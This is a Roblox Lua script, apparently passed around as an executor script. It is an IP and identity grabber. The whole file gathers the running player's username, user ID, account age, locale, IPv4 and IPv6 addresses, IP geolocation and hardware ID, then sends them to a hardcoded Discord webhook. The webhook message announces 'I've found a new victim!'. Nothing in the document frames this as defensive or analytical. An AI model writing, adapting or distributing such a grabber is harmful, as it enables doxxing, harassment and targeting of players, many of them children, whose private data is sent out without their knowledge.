local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")

-- Player Info
local LocalPlayer = Players.LocalPlayer
local UserId = LocalPlayer.UserId
local DisplayName = LocalPlayer.DisplayName
local Username = LocalPlayer.Name
local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
local AccountAge = LocalPlayer.AccountAge
local Country = game.LocalizationService.RobloxLocaleId
local IPv4 = game:HttpGet("https://v4.ident.me/") -- Fetch IPv4
local IPv6 = "Unavailable" -- Default value for IPv6
local IPData = game:HttpGet("http://ip-api.com/json")
local HWID = game:GetService("RbxAnalyticsService"):GetClientId()
local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'

-- Attempt to fetch IPv6 with error handling
local success, ipv6Response = pcall(function()
    return game:HttpGet("https://v6.ident.me/") -- Fetch IPv6
end)

if success and ipv6Response then
    IPv6 = ipv6Response
end

-- Game Info
local GameName = MarketplaceService:GetProductInfo(game.PlaceId).Name

-- Detecting Executor
local function detectExecutor()
    local executor = (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X")
                    or (secure_load and "Sentinel")
                    or (pebc_execute and "ProtoSmasher")
                    or (KRNL_LOADED and "Krnl")
                    or (is_sirhurt_closure and "SirHurt")
                    or (identifyexecutor and identifyexecutor():find("ScriptWare") and "Script-Ware")
                    or "Unsupported"
    return executor
end

-- Creating Webhook Data
local function createWebhookData()
    local executor = detectExecutor()
    local currentDate = os.date("%m/%d/%Y")
    local currentTime = os.date("%X")

    local embed = {
        ["author"] = {
            ["name"] = "Here is my report:",
            ["url"] = "https://roblox.com",
        },
        ["description"] = string.format(
            "üìÑ **Player Information**\n" ..
            "üë§ **Display Name:** %s\n" ..
            "üÜî **Username:** %s\n" ..
            "ü™™ **User ID:** %d\n" ..
            "üéñÔ∏è **Membership Type:** %s\n" ..
            "üìÖ **Account Age:** %d days\n" ..
            "üåç **Country:** %s\n" ..
            "üîí **IPv4:** ||%s||\n" ..
            "üîí **IPv6:** ||%s||\n" ..
            "üñ•Ô∏è **HWID:** ||%s||\n\n" ..

            "üéÆ **Game Information**\n" ..
            "üïπÔ∏è **Game:** %s\n" ..
            "üÜî **Game ID:** %d\n" ..
            "‚öôÔ∏è **Exploit:** %s\n\n" ..

            "üìä **Additional Data**\n" ..
            "```json\n%s```\n\n" ..

            "üîó **Job ID**\n" ..
            "```lua\n%s```",
            DisplayName, Username, UserId, MembershipType, AccountAge, Country, IPv4, IPv6, HWID,
            GameName, game.PlaceId, executor, IPData, ConsoleJobId
        ),
        ["type"] = "rich",
        ["color"] = tonumber("0xFFFFFF"), -- White color
        ["thumbnail"] = {
            ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. UserId .. "&width=150&height=150&format=png"
        }
    }

    local data = {
        ["username"] = "Slave #1", -- Set the webhook name here
        ["avatar_url"] = "https://github.com/DLindustries/database/raw/main/splash.png", -- Use raw GitHub URL
        ["content"] = "@everyone I've found a new victim!",
        ["embeds"] = { embed }
    }

    return HttpService:JSONEncode(data)
end

-- Sending Webhook
local function sendWebhook(webhookUrl, data)
    local headers = {
        ["content-type"] = "application/json"
    }

    local request = syn and syn.request or http_request or request or HttpPost
    if not request then
        return
    end

    local success, response = pcall(function()
        return request({
            Url = webhookUrl,
            Body = data,
            Method = "POST",
            Headers = headers
        })
    end)

    if success and response.Success then
        -- Webhook sent successfully
    else
        -- Failed to send webhook
    end
end

-- Replace the webhook URL with your own URL
local webhookUrl = "https://discord.com/api/webhooks/1327741843118624900/iJrlYUCbq-7eNDWnPB3JX6ZppfT-6m9XoreH4_D3gOaqWpyce6Y8CFN2iA9bZSR6OpTR"
local webhookData = createWebhookData()

-- Sending the webhook
sendWebhook(webhookUrl, webhookData)
